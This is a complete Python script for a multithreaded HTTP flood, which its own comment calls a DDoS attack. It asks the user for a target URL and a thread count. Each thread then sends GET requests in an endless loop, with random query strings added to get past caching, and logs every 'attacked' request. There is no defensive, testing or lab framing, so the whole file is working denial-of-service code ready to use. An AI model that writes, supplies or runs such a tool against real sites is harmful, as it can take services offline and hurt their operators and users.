import threading
import requests
import random
import string

def generate_random_data():
    """Generate random data to append to the URL to create unique requests."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(10))

def attack(url):
    while True:
        try:
            full_url = f"{url}?{generate_random_data()}"
            response = requests.get(full_url)
            print(f"Attacked {full_url} with response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def main():
    # Get target URL from user input
    url = input("Enter the target URL: ")
    # Number of threads
    num_threads = int(input("Enter the number of threads: "))

    # Create multiple threads to simulate a DDoS attack
    threads = []

    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(url,))
        thread.daemon = True
        threads.append(thread)

    # Start all threads
    for thread in threads:
        thread.start()

    # Keep the main thread alive
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
